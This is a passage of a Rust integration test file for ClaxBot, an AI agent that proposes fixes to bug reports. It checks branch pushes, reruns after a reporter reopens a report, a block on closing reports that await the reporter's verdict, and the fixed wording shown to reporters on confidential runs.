//! ClaxBot's workspace on a daemon, from a reporter's side: real reporter
//! routes, a real run on the daemon's driver against a scripted Messages
//! API, and [`ContainerWorkspace`] over a local git repository, with a
//! "container" that is a scratch directory. A fix is an agent's, what the
//! reporter says of it starts a further run on the same branch, a
//! confidential run shows the reporter fixed words and a link, and who gets
//! a shell on a report follows the queue's membership.

use clax_bot::workspace::{
    AUTO_RUNS_STOPPED, FIX_PROPOSED, FakeWorkspace, Offer, PREVIEW_MISSED, PREVIEW_READY,
    PreviewSink, Proposal, REPLY_RECEIVED,
};
use clax_bot::{BotHost, Workspace};
use clax_bot_sandbox::HostError;
use clax_bot_workspace::forge::{Forge, NewPullRequest, PullRequest, UnsignedCommits};
use clax_bot_workspace::linked::StoreTargets;
use clax_bot_workspace::net::Reach;
use clax_bot_workspace::preview::Preview;
use clax_bot_workspace::repo::{Policy, StaticAccess};
use clax_bot_workspace::runtime::{
    Container, ContainerRuntime, ContainerSpec, Exec, ExecOutput, Found,
};
use clax_bot_workspace::workspace::{ContainerWorkspace, REPO_DIR, Target};
use clax_core::audit::AuditCtx;
use clax_core::queue::{ReportersSee, Role, State};
use clax_core::report::{FixOutcome, ProposerKind};
use clax_core::sig::{self, KeyPair, SignInput};
use clax_store::bot_runs::{NewRun, RequestKind, Run, RunStatus, StepKind, WokenBy};
use clax_store::bot_settings::Setting;
use clax_store::credits::KeySource;
use clax_store::flags::Flag;
use clax_store::queue_repos::{Egress, TokenKind};
use clax_store::queues::{NewQueue, Visibility};
use clax_store::secrets::Kek;
use clax_testkit::TestServer;
use clax_testkit::fake_messages::{FakeMessages, Turn};
use serde_json::{Value, json};
use sha2::Digest;
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::{Arc, Mutex, OnceLock};
use std::time::Duration;

const KEY: &str = "sk-ant-api03-FAKEKEYFORTESTS-wxyz";
const ORIGIN: &str = "https://app.example";
const SECRET: &str = "SECRET-SOURCE-LINE";
/// What a confidential run writes on every way out.
const MARKER: &str = "PRIVATE-SOURCE-MARKER";

/// The workspace a daemon was started with, known once the queue it serves
/// is: the daemon starts first.
#[derive(Default)]
struct Late {
    inner: OnceLock<Arc<dyn Workspace>>,
    /// Done once, after the next command.
    after_command: Mutex<Option<Box<dyn FnOnce() + Send>>>,
    /// The sink the deps gave, for the workspace when it comes.
    sink: Mutex<Option<Arc<dyn PreviewSink>>>,
}

impl Late {
    fn get(&self) -> &Arc<dyn Workspace> {
        self.inner.get().expect("the test set the workspace")
    }

    fn set(&self, w: Arc<dyn Workspace>) {
        if let Some(sink) = self.sink.lock().unwrap().clone() {
            w.previews(sink);
        }
        assert!(self.inner.set(w).is_ok());
    }
}

#[async_trait::async_trait]
impl Workspace for Late {
    fn offer(&self, run: &Run, queue: Option<&str>) -> Offer {
        self.inner
            .get()
            .map_or(Offer::default(), |w| w.offer(run, queue))
    }
    async fn exec(
        &self,
        run: &Run,
        queue: Option<&str>,
        command: &str,
        cwd: Option<&str>,
        timeout_secs: u64,
    ) -> Result<Value, HostError> {
        let done = self
            .get()
            .exec(run, queue, command, cwd, timeout_secs)
            .await;
        let then = self.after_command.lock().unwrap().take();
        if let Some(then) = then {
            then();
        }
        done
    }
    async fn propose(&self, run: &Run, p: &Proposal) -> Result<Value, HostError> {
        self.get().propose(run, p).await
    }
    fn previews(&self, sink: Arc<dyn PreviewSink>) {
        *self.sink.lock().unwrap() = Some(sink);
    }
    async fn finish(&self, run: &Run) {
        self.get().finish(run).await;
    }
    async fn reap(&self, active: &[String]) {
        if let Some(w) = self.inner.get() {
            w.reap(active).await;
        }
    }
}

/// A "container": a scratch directory standing for the container's
/// filesystem, the repository's fixed path mapped into it.
struct Scratch {
    dir: PathBuf,
}

impl Scratch {
    fn here(&self, text: &str) -> String {
        text.replace(REPO_DIR, &self.dir.join("repo").to_string_lossy())
    }
}

#[async_trait::async_trait]
impl Container for Scratch {
    fn id(&self) -> &str {
        "scratch"
    }
    async fn exec(&self, exec: &Exec) -> anyhow::Result<ExecOutput> {
        let command = self.here(&exec.command);
        let mut c = tokio::process::Command::new("sh");
        c.args(["-c", &format!("{{ {command}; }} 2>&1")]);
        c.envs(&exec.envs);
        c.env("GIT_CONFIG_GLOBAL", "/dev/null");
        c.current_dir(
            exec.cwd
                .as_deref()
                .map_or_else(|| self.dir.clone(), |d| PathBuf::from(self.here(d))),
        );
        let out = c.output().await?;
        Ok(ExecOutput {
            exit_code: out.status.code().unwrap_or(-1),
            output: String::from_utf8_lossy(&out.stdout).into_owned(),
        })
    }
}

/// Makes [`Scratch`] containers under one directory.
struct Scratches {
    dir: PathBuf,
    made: Mutex<u32>,
}

#[async_trait::async_trait]
impl ContainerRuntime for Scratches {
    fn limits_domains(&self) -> bool {
        false
    }
    async fn create(&self, _spec: &ContainerSpec) -> anyhow::Result<Box<dyn Container>> {
        let mut n = self.made.lock().unwrap();
        *n += 1;
        let dir = self.dir.join(format!("c{n}"));
        std::fs::create_dir_all(&dir)?;
        Ok(Box::new(Scratch { dir }))
    }
    async fn attach(&self, _id: &str, _spec: &ContainerSpec) -> anyhow::Result<Box<dyn Container>> {
        anyhow::bail!("a scratch directory is not attached to")
    }
    async fn find(&self, _labels: &BTreeMap<String, String>) -> anyhow::Result<Vec<Found>> {
        Ok(Vec::new())
    }
    async fn destroy(&self, _id: &str) -> anyhow::Result<()> {
        Ok(())
    }
}

/// Pull requests, by branch.
#[derive(Default)]
struct Forged {
    opened: Mutex<Vec<NewPullRequest>>,
}

#[async_trait::async_trait]
impl Forge for Forged {
    async fn find_open(&self, head: &str) -> anyhow::Result<Option<PullRequest>> {
        let opened = self.opened.lock().unwrap();
        Ok(opened.iter().position(|p| p.head == head).map(pull))
    }
    async fn open(&self, pr: &NewPullRequest) -> anyhow::Result<PullRequest> {
        let mut opened = self.opened.lock().unwrap();
        opened.push(pr.clone());
        Ok(pull(opened.len() - 1))
    }
}

fn pull(i: usize) -> PullRequest {
    PullRequest {
        number: i as u64 + 1,
        html_url: format!("https://forge.example/pr/{}", i + 1),
    }
}

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git")
        .args(["-c", "user.name=T", "-c", "user.email=t@example.test"])
        .args(args)
        .current_dir(dir)
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .output()
        .unwrap();
    assert!(out.status.success(), "git {args:?}: {out:?}");
    String::from_utf8_lossy(&out.stdout).into_owned()
}

/// A bare repository with one commit on `main`, in `dir`: its URL. A
/// `file://` URL, so a clone copies and links nothing.
fn seeded(dir: &Path) -> String {
    let (bare, seed) = (dir.join("origin.git"), dir.join("seed"));
    std::fs::create_dir_all(&bare).unwrap();
    std::fs::create_dir_all(&seed).unwrap();
    git(&bare, &["init", "--quiet", "--bare", "-b", "main"]);
    git(&seed, &["init", "--quiet", "-b", "main"]);
    std::fs::write(seed.join("app.txt"), "the app\n").unwrap();
    git(&seed, &["add", "-A"]);
    git(&seed, &["commit", "--quiet", "-m", "seed"]);
    let url = format!("file://{}", bare.display());
    git(&seed, &["push", "--quiet", &url, "main"]);
    url
}

/// `git http-backend` over the bare repository seeded in `dir`, as a remote a
/// link can name: its root, and the `Authorization` of each request.
async fn linked_remote(dir: &Path) -> (String, Arc<Mutex<Vec<String>>>) {
    seeded(dir);
    let seen = Arc::new(Mutex::new(Vec::new()));
    let (root, log) = (dir.to_path_buf(), seen.clone());
    let serve = move |req: axum::extract::Request| {
        let (root, log) = (root.clone(), log.clone());
        async move {
            let (parts, body) = req.into_parts();
            if let Some(a) = parts.headers.get("authorization") {
                log.lock().unwrap().push(a.to_str().unwrap().to_string());
            }
            let body = axum::body::to_bytes(body, usize::MAX).await.unwrap();
            let mut child = tokio::process::Command::new("git")
                .arg("http-backend")
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .env("GIT_CONFIG_COUNT", "1")
                .env("GIT_CONFIG_KEY_0", "http.receivepack")
                .env("GIT_CONFIG_VALUE_0", "true")
                .env("GIT_PROJECT_ROOT", &root)
                .env("GIT_HTTP_EXPORT_ALL", "1")
                .env("REMOTE_USER", "x-access-token")
                .env("REQUEST_METHOD", parts.method.as_str())
                .env("PATH_INFO", parts.uri.path())
                .env("QUERY_STRING", parts.uri.query().unwrap_or_default())
                .env(
                    "CONTENT_TYPE",
                    parts
                        .headers
                        .get("content-type")
                        .map_or("", |v| v.to_str().unwrap()),
                )
                .env("CONTENT_LENGTH", body.len().to_string())
                .stdin(std::process::Stdio::piped())
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::null())
                .spawn()
                .unwrap();
            let mut stdin = child.stdin.take().unwrap();
            let feed = async move {
                tokio::io::AsyncWriteExt::write_all(&mut stdin, &body)
                    .await
                    .unwrap();
            };
            let (out, ()) = tokio::join!(child.wait_with_output(), feed);
            let out = out.unwrap().stdout;
            let split = out.windows(4).position(|w| w == b"\r\n\r\n").unwrap();
            let mut r = axum::response::Response::builder();
            for line in String::from_utf8_lossy(&out[..split]).lines() {
                let (name, value) = line.split_once(": ").unwrap();
                if name.eq_ignore_ascii_case("status") {
                    r = r.status(value.split(' ').next().unwrap().parse::<u16>().unwrap());
                } else {
                    r = r.header(name, value);
                }
            }
            r.body(axum::body::Body::from(out[split + 4..].to_vec()))
                .unwrap()
        }
    };
    let listener = tokio::net::TcpListener::bind(("127.0.0.1", 0))
        .await
        .unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let app = axum::Router::new().fallback(serve);
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    (base, seen)
}

/// The two pull request routes of a forge.
async fn pulls_forge() -> String {
    use axum::response::IntoResponse;
    let handle = |req: axum::extract::Request| async move {
        if req.method() == axum::http::Method::GET {
            return axum::Json(json!([])).into_response();
        }
        let pr = json!({"number": 7, "html_url": "https://forge.example/pr/7"});
        (axum::http::StatusCode::CREATED, axum::Json(pr)).into_response()
    };
    let listener = tokio::net::TcpListener::bind(("127.0.0.1", 0))
        .await
        .unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let app = axum::Router::new().fallback(handle);
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    base
}

/// A daemon with one queue for [`ORIGIN`], its service grant, and a driver
/// running `fake`'s turns over a workspace set later.
struct Daemon {
    ts: TestServer,
    fake: FakeMessages,
    late: Arc<Late>,
    qid: String,
    service_token: String,
    service_key: KeyPair,
    driver: Arc<clax_bot::Driver>,
}

impl Daemon {
    async fn start(turns: Vec<Turn>) -> Daemon {
        let fake = FakeMessages::start(turns).await;
        let late = Arc::new(Late::default());
        let held = Arc::new(Mutex::new(None));
        let (h, w) = (held.clone(), late.clone());
        // On the LAN, so people connect by invite.
        let ts = TestServer::spawn_on("0.0.0.0".parse().unwrap(), move |s| {
            let web = Arc::new(clax_bot::web::FakeWebSource::new());
            let d = clax_server::bot::driver_with(s, web, Some(w));
            clax_server::bot::start_driver(&d);
            *h.lock().unwrap() = Some(d);
        })
        .await;
        ts.store
            .set_bot_settings(
                &AuditCtx::DAEMON,
                &[(Setting::BaseUrl, Some(json!(fake.base)))],
            )
            .unwrap();
        let res = ts
            .client
            .put(format!("{}/api/admin/provider/key", ts.base))
            .header("cookie", ts.owner_cookie())
            .json(&json!({"key": KEY}))
            .send()
            .await
            .unwrap();
        assert_eq!(res.status(), 200);
        let qid = ts
            .store
            .create_queue(
                &AuditCtx::DAEMON,
                None,
                NewQueue {
                    name: "App".into(),
                    origins: vec![ORIGIN.into()],
                    reporters_see: ReportersSee::Own,
                },
            )
            .unwrap()
            .id;
        let (_, token, key) = ts
            .store
            .create_service_grant(&AuditCtx::DAEMON, &qid, "app backend")
            .unwrap();
        let driver = held.lock().unwrap().take().unwrap();
        Daemon {
            ts,
            fake,
            late,
            qid,
            service_token: token.expose().to_string(),
            service_key: key,
            driver,
        }
    }

    /// The daemon's queue is now a new one made by `maker`.
    fn queue_of(&mut self, maker: &str) {
        self.qid = self
            .ts
            .store
            .create_queue(
                &AuditCtx::DAEMON,
                Some(maker),
                NewQueue {
                    name: "Theirs".into(),
                    origins: vec![ORIGIN.into()],
                    reporters_see: ReportersSee::Own,
                },
            )
            .unwrap()
            .id;
        let (_, token, key) = self
            .ts
            .store
            .create_service_grant(&AuditCtx::DAEMON, &self.qid, "app backend")
            .unwrap();
        self.service_token = token.expose().to_string();
        self.service_key = key;
    }

    /// What [`report_follow_up`] makes of report `tid` now, the run handed
    /// to the driver.
    async fn follow(&self, tid: &str) -> Option<String> {
        let (st, bot, ctx) = (
            self.ts.store.clone(),
            self.ts.state.bot.clone(),
            self.ts.state.feedback_ctx(),
        );
        let (ws, tid) = (self.late.clone() as Arc<dyn Workspace>, tid.to_string());
        let made = tokio::task::spawn_blocking(move || {
            clax_server::bot::report_follow_up(&st, &bot, &ctx, ws.as_ref(), &tid).unwrap()
        })
        .await
        .unwrap();
        if let Some(r) = &made {
            self.driver.wake(r);
        }
        made
    }

    /// What the queue's members read of report `tid`.
    fn report(&self, tid: &str) -> clax_core::queue::Report {
        self.ts
            .store
            .report(&self.qid, tid, Visibility::All)
            .unwrap()
            .unwrap()
    }

    /// `r` says the fix on `tid` does not work.
    async fn reopen(&self, r: &Reporter, tid: &str, note: &str) {
        let pq = format!("{}/{tid}/reopen", self.reports());
        let res = self.multipart(r, &pq, &[("body", note)]).await;
        assert_eq!(res.status(), 200);
    }

    /// The report's reporter reopens `tid` in the store: no event follows.
    async fn reopen_straight(&self, tid: &str) {
        let (st, q, t) = (self.ts.store.clone(), self.qid.clone(), tid.to_string());
        tokio::task::spawn_blocking(move || {
            st.reopen_report(
                &AuditCtx::DAEMON,
                &q,
                &t,
                clax_store::queues::Verdict::Reporter("emp-1"),
                "Still broken".to_string(),
                None,
                None,
                None,
            )
            .unwrap();
        })
        .await
        .unwrap();
    }

    /// The queue's reporters see every report of it.
    async fn reporters_see_all(&self) {
        let (st, q) = (self.ts.store.clone(), self.qid.clone());
        tokio::task::spawn_blocking(move || {
            let see_all = clax_store::queues::QueuePatch {
                reporters_see: Some(ReportersSee::All),
                ..Default::default()
            };
            st.update_queue(&AuditCtx::DAEMON, &q, see_all).unwrap();
        })
        .await
        .unwrap();
    }

    /// `r` replies on `tid`.
    async fn reply(&self, r: &Reporter, tid: &str, body: &str) {
        let pq = format!("{}/{tid}/comments", self.reports());
        let body = serde_json::to_vec(&json!({"body": body})).unwrap();
        let res = self
            .as_reporter(
                r,
                reqwest::Method::POST,
                &pq,
                Some("application/json"),
                body,
            )
            .await;
        assert_eq!(res.status(), 200);
    }

    /// `path` with `cookie`: its status and body as text. An event stream
    /// ends once its run has.
    async fn read_with(&self, cookie: Option<&str>, path: &str) -> (u16, String) {
        let mut req = self.ts.client.get(format!("{}{path}", self.ts.base));
        if let Some(c) = cookie {
            req = req.header("cookie", c);
        }
        let res = req.send().await.unwrap();
        let status = res.status().as_u16();
        let text = tokio::time::timeout(clax_testkit::HANG, res.text())
            .await
            .expect("the body ended")
            .unwrap();
        (status, text)
    }

    /// Every route a browser reaches about run `rid` on report `tid` of
    /// artifact `aid`.
    fn run_routes(&self, rid: &str, aid: &str, tid: &str) -> Vec<String> {
        vec![
            format!("/api/queues/{}/reports/{tid}", self.qid),
            format!("/api/queues/{}/reports", self.qid),
            format!("/api/toolpath/export?artifact={aid}"),
            "/api/toolpath/export".to_string(),
            format!("/api/bot/runs?artifact={aid}"),
            format!("/api/bot/runs/{rid}"),
            format!("/api/bot/runs/{rid}/events"),
            format!("/api/bot/runs/{rid}/draft/"),
            format!("/api/bot/runs/{rid}/draft/index.html"),
            format!("/api/artifacts/{aid}"),
            format!("/api/artifacts/{aid}/threads"),
            format!("/api/artifacts/{aid}/threads/{tid}"),
            "/api/inbox".to_string(),
            "/api/audit?limit=500".to_string(),
        ]
    }

    /// Asserts [`MARKER`] is in nothing `cookie`'s holder reads.
    async fn reads_nothing(&self, who: &str, cookie: Option<&str>, rid: &str, report: &Value) {
        let (aid, tid) = (report["artifact"]["id"].as_str().unwrap(), id_of(report));
        for path in self.run_routes(rid, aid, tid) {
            let (status, text) = self.read_with(cookie, &path).await;
            assert!(
                !text.contains(MARKER),
                "{who} read the marker at {path} ({status}): {text}"
            );
        }
    }

    fn with(&self, w: impl Workspace + 'static) {
        self.late.set(Arc::new(w));
    }

    /// A real repository target for the daemon's queue, in `dir`: its forge.
    fn with_repository(&self, dir: &Path) -> Arc<Forged> {
        let url = seeded(dir);
        let forge = Arc::new(Forged::default());
        let target = Target {
            stamp: None,
            queue: self.qid.clone(),
            repo_url: url.clone(),
            container_repo_url: url,
            base: "main".into(),
            access: Arc::new(StaticAccess::default()),
            reviewed_previews: false,
            confidential: false,
            wake_on_reply: false,
            unsigned: UnsignedCommits::Allow,
            policy: Policy::default(),
            forge: forge.clone(),
            preview: Preview {
                // The daemon's own health stands for a preview that is up.
                url_template: format!("{}/healthz?pr={{pr}}", self.ts.base),
                ready_path: String::new(),
                ready_names_commit: false,
                timeout: Duration::ZERO,
                poll: Duration::ZERO,
            },
            reach: Reach::any(),
        };
        let runtime = Arc::new(Scratches {
            dir: dir.join("containers"),
            made: Mutex::new(0),
        });
        self.with(ContainerWorkspace::new(
            runtime,
            ContainerSpec::default(),
            vec![target],
            false,
        ));
        forge
    }

    /// A confidential link of the daemon's queue to a repository served in
    /// `dir`, its forge `forge`, with the workspace looking it up per run.
    async fn with_link(&self, dir: &Path, forge: &str) -> Arc<Mutex<Vec<String>>> {
        let (root, seen) = linked_remote(dir).await;
        let fields = serde_json::from_value(json!({
            "repo": "o/r",
            "repo_url": format!("{root}/origin.git"),
            "forge_api_url": forge,
            "preview_url": format!("{}/pr-{{pr}}", self.ts.base),
            "preview_ready_path": "/healthz",
            "preview_names_commit": false,
            "access": {"kind": "token"},
            "ci_accepted": true,
        }))
        .unwrap();
        let store = &self.ts.store;
        let rev = store
            .set_queue_repo(&AuditCtx::DAEMON, &self.qid, &fields, true)
            .unwrap()
            .rev;
        let kek = Kek::from_bytes([7; 32]);
        for (kind, token) in [
            (TokenKind::Write, "github_pat_WRITE_0123456789-rite"),
            (TokenKind::Read, "github_pat_READ_0123456789-read"),
        ] {
            store
                .set_queue_repo_token(&AuditCtx::DAEMON, &kek, &self.qid, kind, token, &rev)
                .unwrap();
        }
        let runtime = Arc::new(Scratches {
            dir: dir.join("containers"),
            made: Mutex::new(0),
        });
        let source = StoreTargets::new(store.clone(), kek, Egress::Held);
        let spec = ContainerSpec::default();
        let w = ContainerWorkspace::new(runtime, spec, vec![], false);
        self.with(w.with_source(Arc::new(source)));
        seen
    }

    fn host(&self) -> String {
        self.ts.base.strip_prefix("http://").unwrap().to_string()
    }

    /// `Clax-Signature` of a request signed by `key` now.
    fn sign(&self, key: &KeyPair, method: &str, pq: &str, token: &str, body: &[u8]) -> String {
        let nonce = sig::new_nonce();
        key.sign(&SignInput {
            method,
            path_and_query: pq,
            host: &self.host(),
            t: self.ts.store.now_utc().timestamp(),
            nonce: &nonce,
            body_sha256: sha2::Sha256::digest(body).into(),
            token_sha256: Some(clax_core::secret::sha256(token)),
            agent_headers_sha256: sig::no_agent_headers_sha256(),
        })
        .unwrap()
        .to_string()
    }

    /// Mints a reporter token.
    async fn reporter(&self) -> Reporter {
        self.reporter_named("emp-1").await
    }

    /// Mints a reporter token for `reporter_id`.
    async fn reporter_named(&self, reporter_id: &str) -> Reporter {
        let key = KeyPair::generate();
        let pq = format!("/api/queues/{}/reporter-tokens", self.qid);
        let body = serde_json::to_vec(&json!({
            "reporter_id": reporter_id, "origin": ORIGIN,
            "public_key": sig::encode_public(&key.public()),
        }))
        .unwrap();
        let sig = self.sign(&self.service_key, "POST", &pq, &self.service_token, &body);
        let res = self
            .ts
            .client
            .post(format!("{}{pq}", self.ts.base))
            .header(
                "authorization",
                format!("Clax-Queue {}", self.service_token),
            )
            .header("clax-signature", sig)
            .header("content-type", "application/json")
            .body(body)
            .send()
            .await
            .unwrap();
        assert_eq!(res.status(), 200);
        let v: Value = res.json().await.unwrap();
        Reporter {
            token: v["token"].as_str().unwrap().to_string(),
            key,
        }
    }

    async fn as_reporter(
        &self,
        r: &Reporter,
        method: reqwest::Method,
        pq: &str,
        content_type: Option<&str>,
        body: Vec<u8>,
    ) -> reqwest::Response {
        let sig = self.sign(&r.key, method.as_str(), pq, &r.token, &body);
        let mut req = self
            .ts
            .client
            .request(method, format!("{}{pq}", self.ts.base))
            .header("authorization", format!("Clax-Reporter {}", r.token))
            .header("clax-signature", sig)
            .header("origin", ORIGIN);
        if let Some(ct) = content_type {
            req = req.header("content-type", ct);
        }
        req.body(body).send().await.unwrap()
    }

    fn reports(&self) -> String {
        format!("/api/queues/{}/reporter/reports", self.qid)
    }

    async fn multipart(&self, r: &Reporter, pq: &str, parts: &[(&str, &str)]) -> reqwest::Response {
        let boundary = "clax-testboundary";
        let mut b = String::new();
        for (name, value) in parts {
            b.push_str(&format!(
                "--{boundary}\r\ncontent-disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n"
            ));
        }
        b.push_str(&format!("--{boundary}--\r\n"));
        let ct = format!("multipart/form-data; boundary={boundary}");
        self.as_reporter(r, reqwest::Method::POST, pq, Some(&ct), b.into_bytes())
            .await
    }

    /// `r` files a report: the report as filed.
    async fn file(&self, r: &Reporter) -> Value {
        let anchor = clax_testkit::element_anchor().to_string();
        let parts = [
            ("url", "https://app.example/orders/7"),
            ("title", "Order 7"),
            ("anchor", anchor.as_str()),
            ("body", "The total is wrong"),
        ];
        let res = self.multipart(r, &self.reports(), &parts).await;
        assert_eq!(res.status(), 201);
        let v: Value = res.json().await.unwrap();
        v["report"].clone()
    }

    /// `r` reads report `tid` as a reporter's route serves it.
    async fn read_as(&self, r: &Reporter, tid: &str) -> Value {
        let pq = self.reports();
        let res = self
            .as_reporter(r, reqwest::Method::GET, &pq, None, Vec::new())
            .await;
        assert_eq!(res.status(), 200);
        let v: Value = res.json().await.unwrap();
        v["reports"]
            .as_array()
            .unwrap()
            .iter()
            .find(|x| x["id"] == tid)
            .unwrap()
            .clone()
    }

    /// The owner sends report `report` to ClaxBot: the run's ID.
    async fn send(&self, report: &Value) -> String {
        let (aid, tid) = (
            report["artifact"]["id"].as_str().unwrap(),
            report["id"].as_str().unwrap(),
        );
        let res = self
            .ts
            .client
            .post(format!("{}/api/bot/runs", self.ts.base))
            .header("cookie", self.ts.owner_cookie())
            .json(&json!({"thread_ids": [tid], "artifact_id": aid}))
            .send()
            .await
            .unwrap();
        assert_eq!(res.status(), 201);
        let v: Value = res.json().await.unwrap();
        v["run"]["id"].as_str().unwrap().to_string()
    }

    /// Waits for `find`, looked at again at each event the daemon publishes.
    async fn when<T>(&self, mut find: impl FnMut() -> Option<T>) -> T {
        let mut rx = self.ts.state.events.subscribe();
        tokio::time::timeout(clax_testkit::HANG, async {
            loop {
                if let Some(v) = find() {
                    return v;
                }
                // A run's end publishes before it is read as ended here,
                // so an event is no promise: look again soon regardless.
                let _ = tokio::time::timeout(Duration::from_millis(20), rx.recv()).await;
            }
        })
        .await
        .expect("the condition held")
    }

    async fn ended(&self, run: &str) -> Run {
        self.when(|| {
            self.ts
                .store
                .run(run)
                .unwrap()
                .filter(|r| r.status.is_terminal())
        })
        .await
    }

    /// The `n`th run of `tid` once it exists (from 0, oldest first) and has
    /// ended.
    async fn nth_run_ended(&self, tid: &str, n: usize) -> Run {
        let id = self
            .when(|| {
                let mut runs = self.ts.store.runs_for_thread(tid, 10).unwrap();
                runs.reverse();
                runs.get(n).map(|r| r.id.clone())
            })
            .await;
        self.ended(&id).await
    }

    /// What run `run`'s first script returned.
    fn script_value(&self, run: &str) -> Value {
        let (_, steps) = self.ts.store.run_with_steps(run).unwrap().unwrap();
        let s = steps.iter().find(|s| s.kind == StepKind::Script).unwrap();
        let text = s.payload.as_ref().unwrap()["result"]["content"]
            .as_str()
            .unwrap()
            .to_string();
        serde_json::from_str::<Value>(&text).unwrap()["value"].clone()
    }

    /// A run of `tid` on `aid` for `person`, asked for by `grant`'s agent,
    /// handed to the driver.
    fn run_for(&self, person: &str, grant: Option<&str>, aid: &str, tid: &str) -> String {
        let run = self.run_held(person, grant, aid, tid);
        self.driver.wake(&run);
        run
    }

    /// [`Daemon::run_for`], not yet handed to the driver.
    fn run_held(&self, person: &str, grant: Option<&str>, aid: &str, tid: &str) -> String {
        self.ts
            .store
            .create_run(
                &clax_bot::run::bot_ctx(person),
                NewRun {
                    artifact_id: aid.into(),
                    person: person.into(),
                    request: RequestKind::Thread,
                    thread_ids: vec![tid.into()],
                    model: "claude-sonnet-5-5".into(),
                    key_source: KeySource::Instance,
                    base_version: 1,
                    agent_grant: grant.map(str::to_string),
                    web: String::new(),
                },
            )
            .unwrap()
            .id
    }
}

struct Reporter {
    token: String,
    key: KeyPair,
}

fn id_of(v: &Value) -> &str {
    v["id"].as_str().unwrap()
}

const FIRST_TRY: &str = r#"
    await clax.shell.exec("echo one > fix.txt");
    return await clax.change.propose({title: "Fix the total", summary: "Rounded it."});
"#;

const SECOND_TRY: &str = r#"
    const seen = await clax.shell.exec("cat fix.txt");
    await clax.shell.exec("echo two >> fix.txt");
    const p = await clax.change.propose({title: "Fix the total", summary: "Rounded it right."});
    return [seen.output, p.pr];
"#;

#[tokio::test]
async fn a_run_cannot_close_a_report_whose_fix_waits_for_its_verdict() {
    let script = r#"
        await clax.shell.exec("echo one > fix.txt");
        await clax.change.propose({title: "Fix the total", summary: "Rounded it."});
        const [t] = await clax.threads.list();
        try {
            await clax.threads.resolve(t.id);
            return "resolved";
        } catch (e) {
            return e.code;
        }
    "#;
    let d = Daemon::start(vec![
        Turn::script("tu_1", "Fix and close", script),
        Turn::finish("Done."),
    ])
    .await;
    let dir = tempfile::tempdir().unwrap();
    d.with_repository(dir.path());
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();

    let run = d.send(&report).await;
    assert_eq!(d.ended(&run).await.status, RunStatus::Finished);
    assert_eq!(d.script_value(&run), json!("fix_waiting"));
    let seen =
        d.ts.store
            .report(&d.qid, &tid, Visibility::All)
            .unwrap()
            .unwrap();
    assert_eq!(seen.state, State::FixProposed, "its reporter still decides");
}

#[tokio::test]
async fn a_repository_connected_in_clax_drives_a_run_whose_reporter_reads_fixed_words() {
    let d = Daemon::start(vec![
        Turn::script("tu_1", "First try", FIRST_TRY),
        Turn::finish("Proposed a fix."),
    ])
    .await;
    let dir = tempfile::tempdir().unwrap();
    let forge = pulls_forge().await;
    let seen = d.with_link(dir.path(), &forge).await;
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();

    let run = d.send(&report).await;
    let ended = d.ended(&run).await;
    assert_eq!(ended.status, RunStatus::Finished, "{ended:?}");
    assert!(ended.confidential, "a link is confidential unless public");
    let origin = dir.path().join("origin.git");
    let file = git(&origin, &["show", &format!("claxbot/{tid}:fix.txt")]);
    assert_eq!(file, "one\n");
    assert!(seen.lock().unwrap().len() > 1, "it asked with its tokens");

    let read = d.read_as(&r, &tid).await.to_string();
    assert!(read.contains(FIX_PROPOSED), "{read}");
    assert!(!read.contains("Rounded it"), "{read}");
    let link = d.ts.store.queue_repo(&d.qid).unwrap().unwrap();
    assert!(link.last_ok_at.is_some(), "not tried yet is over");
    assert_eq!(link.last_failure, None);
}

#[tokio::test]
async fn a_reporters_still_broken_reaches_claxbot_and_a_further_run_pushes_to_the_same_branch() {
    let d = Daemon::start(vec![
        Turn::script("tu_1", "First try", FIRST_TRY),
        Turn::finish("Proposed a fix."),
        Turn::script("tu_2", "Second try", SECOND_TRY),
        Turn::finish("Proposed it again."),
    ])
    .await;
    let dir = tempfile::tempdir().unwrap();
    let forge = d.with_repository(dir.path());
    let r = d.reporter().await;
    let report = d.file(&r).await;
    let tid = id_of(&report).to_string();

    let first = d.send(&report).await;
    assert_eq!(d.ended(&first).await.status, RunStatus::Finished);
    // Its reporter has it once its preview answers.
    let filed = d
        .when(|| Some(d.report(&tid)).filter(|r| !r.fixes[0].held))
        .await;
    assert_eq!(filed.state, State::FixProposed);
    assert_eq!(filed.fixes[0].proposer_kind, ProposerKind::Agent);
    assert_eq!(filed.fixes[0].proposer_name, "ClaxBot");
    assert_eq!(filed.fixes[0].fix.summary, FIX_PROPOSED);
    assert!(filed.fixes[0].fix.verify_url.is_some());
    // The audit trail names ClaxBot acting for the run's person.
    let fix =
        d.ts.store
            .events_after(0, 10_000)
            .unwrap()
            .into_iter()
            .find(|e| e.kind == "queue.fix")
            .expect("the fix is recorded");
    assert!(fix.actor.contains("\"bot\""), "{}", fix.actor);
    assert!(fix.actor.contains("*owner"), "{}", fix.actor);
    assert!(
        d.ts.store.list_sessions(false).unwrap().is_empty(),
        "no session was made for it"
    );

    let pq = format!("{}/{tid}/reopen", d.reports());
    let res = d
        .multipart(&r, &pq, &[("body", "It is still broken on the total")])
        .await;
    assert_eq!(res.status(), 200);

    let second = d.nth_run_ended(&tid, 1).await;
    assert_eq!(second.status, RunStatus::Finished);
    assert_eq!(second.person, "*owner");
    let asked = d.fake.requests()[2].to_string();
    assert!(asked.contains("It is still broken on the total"), "{asked}");
    // It began from the branch, and pushed to it: one pull request, two commits.
    assert_eq!(
        d.script_value(&second.id),
        json!(["one\n", 1]),
        "the second run reads the first's change"
    );
    let opened = forge.opened.lock().unwrap();
    assert_eq!(opened.len(), 1, "{opened:?}");
    let branch = format!("claxbot/{tid}");
    assert_eq!(opened[0].head, branch);
    let origin = dir.path().join("origin.git");
    let log = git(&origin, &["log", "--format=%s", &format!("main..{branch}")]);
    assert_eq!(log.lines().count(), 2, "{log}");
